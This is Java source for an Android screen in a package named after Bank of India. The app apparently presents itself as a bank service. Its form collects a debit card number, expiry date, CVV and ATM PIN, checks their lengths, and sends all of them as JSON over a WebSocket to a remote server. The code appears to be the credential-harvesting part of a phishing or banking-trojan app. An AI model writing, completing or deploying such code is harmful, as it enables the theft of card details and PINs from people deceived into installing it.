package com.service.bankofindia2;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class ThirdActivity extends  BaseActivity {

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);

        EditText card = findViewById(R.id.cardNum);
        card.addTextChangedListener(new DebitCardInputMask(card));

        EditText expiry = findViewById(R.id.expiryDate);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));

        int form_id = getIntent().getIntExtra("form_id", -1);

        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.cardNum, "cardNum");
        ids.put(R.id.expiryDate, "expiryDate");
        ids.put(R.id.CVV, "CVV");
        ids.put(R.id.atmpin2, "atmpin2");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        RelativeLayout buttonSubmit = findViewById(R.id.submitButton);
        buttonSubmit.setOnClickListener(v -> {
            if (!validateForm()) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "cardNum":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "CVV":
                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "atmpin2":
                    if (!FormValidator.validateMinLength(editText, 4,  "Required 4 Digit Pin")) {
                        isValid = false;
                    }
                    break;
                case "expiryDate":
                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;


                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

}
